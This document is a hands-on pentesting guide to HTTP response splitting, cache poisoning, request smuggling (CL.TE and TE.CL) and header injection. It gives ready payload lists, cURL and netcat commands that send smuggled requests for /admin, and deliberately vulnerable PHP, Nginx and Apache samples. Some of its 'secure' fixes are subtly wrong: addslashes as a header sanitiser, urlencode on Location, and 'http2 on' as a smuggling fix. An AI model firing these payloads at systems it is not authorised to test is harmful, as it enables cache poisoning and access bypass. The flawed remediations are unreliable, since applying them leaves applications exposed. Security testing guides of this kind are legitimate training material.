# Testing for HTTP Splitting and Smuggling Vulnerabilities

## Overview

Testing for HTTP Splitting and Smuggling vulnerabilities involves verifying that a web application properly handles HTTP headers and request parsing to prevent attackers from manipulating responses, poisoning caches, or bypassing security controls. According to OWASP (WSTG-INPV-015), HTTP Splitting (also known as HTTP Response Splitting) occurs when untrusted input is included in HTTP response headers, allowing attackers to inject additional headers or responses. HTTP Smuggling exploits discrepancies in how servers and proxies parse HTTP requests, enabling request smuggling to bypass filters or poison backend systems. This guide provides a hands-on methodology to test for these vulnerabilities, focusing on identifying vulnerable endpoints, HTTP response splitting, cache poisoning, HTTP request smuggling (CL.TE and TE.CL), and header injection, with tools, commands, payloads, and remediation strategies.

**Impact**: HTTP Splitting and Smuggling vulnerabilities can lead to:
- Cross-site scripting (XSS) or cache poisoning via response manipulation.
- Bypassing security controls (e.g., WAF, authentication).
- Unauthorized access to backend systems or user sessions.
- Denial of service (DoS) through cache or proxy disruption.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

**Ethical Note**: Obtain explicit permission before testing, as these attacks may disrupt proxies, poison caches, or affect other users’ sessions.

## Testing Tools

The following tools are recommended for testing HTTP Splitting and Smuggling vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject splitting or smuggling payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify endpoints.
  - **Note**: Enable “HTTP Request Smuggler” extension for smuggling tests.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with smuggling rules; manually verify findings due to false positives.

- **cURL and HTTPie**: Send HTTP requests with splitting or smuggling payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i -H "Host: example.com" --data $'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n' http://example.com
      # HTTPie
      http --raw $'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n' http://example.com
      ```

- **Postman**: GUI tool for testing HTTP payloads in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send raw HTTP requests with smuggling payloads.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to splitting or smuggling payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze headers and Elements tab for injected content.
  - **Note**: Firefox’s 2025 header inspection enhancements improve debugging.

- **Netcat (nc)**: Tests raw HTTP connections for smuggling.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "POST / HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\n\n5\nSMUGG\n0\n\nGET /admin HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-015, testing HTTP Splitting and Smuggling vulnerabilities across vulnerable endpoints, response splitting, cache poisoning, request smuggling (CL.TE and TE.CL), and header injection.

### Common HTTP Splitting and Smuggling Payloads

Below is a list of common payloads to test for HTTP Splitting and Smuggling vulnerabilities. Start with simple payloads and escalate based on responses. Use with caution in controlled environments to avoid cache poisoning or proxy disruption.

- **HTTP Splitting Payloads**:
  - `%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>malicious</html>` (Injects new response)
  - `%0d%0aSet-Cookie:%20session=malicious` (Injects cookie)
  - `\r\nX-Injected: malicious` (Header injection)
  - `%0aLocation:%20http://attacker.com` (Redirect injection)

- **Cache Poisoning Payloads**:
  - `%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>` (Poisons cache with XSS)
  - `%0d%0aCache-Control:%20public,%20max-age=31536000` (Forces cache storage)
  - `/poison.css%0d%0aContent-Type:%20text/css%0d%0a%0d%0abody{background:malicious}` (CSS poisoning)
  - `%0d%0aETag:%20malicious` (Cache manipulation)

- **HTTP Smuggling (CL.TE) Payloads**:
  - `POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nSMUGG\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n` (Smuggles GET request)
  - `Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: example.com\r\n\r\n` (CL.TE mismatch)
  - `Content-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: example.com\r\n\r\n` (Extended smuggling)

- **HTTP Smuggling (TE.CL) Payloads**:
  - `POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n` (TE.CL mismatch)
  - `Transfer-Encoding: chunked\r\nContent-Length: 10\r\n\r\n5\r\nSMUGG\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: example.com\r\n\r\n` (Smuggled request)
  - `Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n0\r\n\r\nPOST /api HTTP/1.1\r\nHost: example.com\r\n\r\n` (Backend smuggling)

- **Header Injection Payloads**:
  - `%0d%0aX-Custom:%20malicious` (Injects custom header)
  - `\r\nHost:%20attacker.com` (Host header manipulation)
  - `%0aX-Forwarded-For:%20192.168.1.1` (Spoofs IP)
  - `%0d%0aContent-Security-Policy:%20default-src%20'none'` (Alters CSP)

**Note**: Payloads depend on server (e.g., Apache, Nginx) and proxy (e.g., Cloudflare, Squid) configurations. Test payloads in headers, query parameters, or POST bodies where HTTP parsing occurs. Use URL encoding (`%0d%0a`) for splitting and raw requests for smuggling.

### 1. Identify Vulnerable Endpoints

**Objective**: Locate inputs or endpoints that may process HTTP headers or requests unsafely.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, redirects, APIs, or pages that handle user input in headers (e.g., `Location`, `Set-Cookie`).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Note parameters (e.g., `redir=/home`, `lang=en`).
3. Inspect responses:
   - Check for header manipulation or multiple responses.
   - Use Developer Tools (`Ctrl+Shift+I`) to analyze headers and cache behavior.
4. List endpoints:
   - Document URLs, forms, headers (e.g., `User-Agent`, `Referer`), and APIs.

**Example Endpoints**:
- URL: `http://example.com/redirect?redir=/home`
- Form: `<input name="lang">`
- API: `POST /api/setlang` with `{"lang": "en"}`

**Remediation**:
- Validate inputs:
  ```php
  if (!preg_match('/^[a-zA-Z0-9\/]+$/', $_GET['redir'])) die("Invalid input");
  ```
- Sanitize headers:
  ```php
  $redir = str_replace(["\r", "\n"], "", $_GET['redir']);
  ```

**Tip**: Save the endpoint list in a report.

### 2. Test for HTTP Response Splitting

**Objective**: Verify if user input can inject additional HTTP responses.

**Steps**:
1. Identify header inputs:
   - Look for parameters in redirects or cookies (e.g., `?redir=/home`).
2. Inject splitting payloads:
   - Use Burp Repeater:
     ```http
     GET /redirect?redir=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>malicious</html> HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/redirect?redir=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>malicious</html>"
     ```
3. Check responses:
   - Look for two HTTP responses or injected HTML.
   - Test: `%0d%0aSet-Cookie:%20session=malicious`.
4. Verify impact:
   - Check for XSS or session hijacking.

**Example Vulnerable Code (PHP)**:
```php
$redir = $_GET['redir'];
header("Location: $redir");
```
Test: `?redir=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>`
Result: Injects malicious response.

**Example Secure Code (PHP)**:
```php
$redir = preg_replace('/[\r\n]/', '', $_GET['redir']);
if (filter_var($redir, FILTER_VALIDATE_URL)) {
    header("Location: $redir");
} else {
    die("Invalid redirect");
}
```
Test: No injection.

**Remediation**:
- Remove CR/LF characters:
  ```php
  $redir = str_replace(["\r", "\n"], "", $redir);
  ```
- Use safe header functions:
  ```php
  header("Location: " . urlencode($redir));
  ```

**Tip**: Save response injection evidence in a report.

### 3. Test for Cache Poisoning

**Objective**: Check if splitting can poison web or proxy caches.

**Steps**:
1. Inject cache poisoning payloads:
   - Test: `?redir=/home%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>`
   - Use Burp:
     ```http
     GET /redirect?redir=/home%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
     Host: example.com
     ```
2. Check cache behavior:
   - Revisit the page without payload (e.g., `/home`).
   - Look for injected content or XSS.
   - Test: `%0d%0aCache-Control:%20public,%20max-age=31536000`.
3. Verify cache headers:
   - Check `Cache-Control`, `ETag` in responses.
4. Clear cache (post-test):
   - Request cache purge if permitted.

**Example Vulnerable Code (PHP)**:
```php
$path = $_GET['path'];
header("Location: /page/$path");
```
Test: `?path=/home%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>`
Result: Poisons cache with XSS.

**Example Secure Code (PHP)**:
```php
$path = str_replace(["\r", "\n"], "", $_GET['path']);
header("Location: /page/" . urlencode($path));
```
Test: No poisoning.

**Remediation**:
- Validate cache inputs:
  ```php
  if (preg_match('/[\r\n]/', $path)) die("Invalid input");
  ```
- Set strict cache headers:
  ```php
  header("Cache-Control: no-store, no-cache");
  ```

**Tip**: Save cache poisoning evidence in a report.

### 4. Test for HTTP Request Smuggling (CL.TE)

**Objective**: Verify if Content-Length and Transfer-Encoding mismatches allow request smuggling.

**Steps**:
1. Inject CL.TE payloads:
   - Use Burp Repeater:
     ```http
     POST / HTTP/1.1
     Host: example.com
     Content-Length: 0
     Transfer-Encoding: chunked

     5
     SMUGG
     0

     GET /admin HTTP/1.1
     Host: example.com

     ```
   - Use Netcat:
     ```bash
     echo -e "POST / HTTP/1.1\nHost: example.com\nContent-Length: 0\nTransfer-Encoding: chunked\n\n5\nSMUGG\n0\n\nGET /admin HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
     ```
2. Check responses:
   - Look for smuggled request effects (e.g., `/admin` access).
   - Test: `Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1`.
3. Monitor timing:
   - Smuggled requests may cause delays or errors.
4. Use Burp’s HTTP Request Smuggler:
   - Automate CL.TE detection.

**Example Vulnerable Config (Nginx)**:
```
server {
    listen 80;
    proxy_pass http://backend;
}
```
Test: CL.TE payload
Result: Smuggles `/admin` request.

**Example Secure Config (Nginx)**:
```
server {
    listen 80;
    proxy_pass http://backend;
    http2 on; # Enforces strict parsing
}
```
Test: No smuggling.

**Remediation**:
- Normalize headers:
  ```nginx
  proxy_set_header Transfer-Encoding "";
  ```
- Use HTTP/2:
  ```nginx
  http2 on;
  ```

**Tip**: Save smuggling evidence in a report.

### 5. Test for HTTP Request Smuggling (TE.CL)

**Objective**: Verify if Transfer-Encoding and Content-Length mismatches allow request smuggling.

**Steps**:
1. Inject TE.CL payloads:
   - Use Burp Repeater:
     ```http
     POST / HTTP/1.1
     Host: example.com
     Transfer-Encoding: chunked
     Content-Length: 4

     0

     GET /admin HTTP/1.1
     Host: example.com

     ```
   - Use Netcat:
     ```bash
     echo -e "POST / HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\n\nGET /admin HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
     ```
2. Check responses:
   - Look for smuggled request effects (e.g., `/admin` access).
   - Test: `Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n0\r\n\r\nPOST /api`.
3. Monitor backend:
   - Check for unexpected requests (gray-box).
4. Use Burp’s HTTP Request Smuggler:
   - Automate TE.CL detection.

**Example Vulnerable Config (Apache)**:
```
<VirtualHost *:80>
    ProxyPass / http://backend/
</VirtualHost>
```
Test: TE.CL payload
Result: Smuggles `/admin`.

**Example Secure Config (Apache)**:
```
<VirtualHost *:80>
    ProxyPass / http://backend/
    RequestHeader unset Transfer-Encoding
</VirtualHost>
```
Test: No smuggling.

**Remediation**:
- Reject ambiguous requests:
  ```apache
  SetEnvIf Transfer-Encoding chunked bad_request=1
  Deny from env=bad_request
  ```
- Validate Content-Length:
  ```nginx
  if ($content_length !~ ^[0-9]+$) { return 400; }
  ```

**Tip**: Save smuggling evidence in a report.

### 6. Test for Header Injection

**Objective**: Check if user input can inject malicious HTTP headers.

**Steps**:
1. Inject header payloads:
   - Test: `?lang=en%0d%0aX-Custom:%20malicious`
   - Use Burp:
     ```http
     GET /setlang?lang=en%0d%0aX-Custom:%20malicious HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/setlang?lang=en%0d%0aX-Custom:%20malicious"
     ```
2. Check responses:
   - Look for injected headers (e.g., `X-Custom: malicious`).
   - Test: `%0aX-Forwarded-For:%20192.168.1.1`.
3. Verify impact:
   - Check for authentication bypass or CSP changes.
   - Test: `%0d%0aContent-Security-Policy:%20default-src%20'none'`.
4. Use Postman for APIs:
   - Send: `{"lang": "en\r\nX-Custom: malicious"}`.

**Example Vulnerable Code (PHP)**:
```php
$lang = $_GET['lang'];
header("X-Lang: $lang");
```
Test: `?lang=en%0d%0aX-Custom:%20malicious`
Result: Injects `X-Custom` header.

**Example Secure Code (PHP)**:
```php
$lang = preg_replace('/[\r\n]/', '', $_GET['lang']);
header("X-Lang: $lang");
```
Test: No injection.

**Remediation**:
- Filter CR/LF:
  ```php
  $lang = str_replace(["\r", "\n"], "", $lang);
  ```
- Use safe header APIs:
  ```php
  header("X-Lang: " . addslashes($lang));
  ```

**Tip**: Save header injection evidence in a report.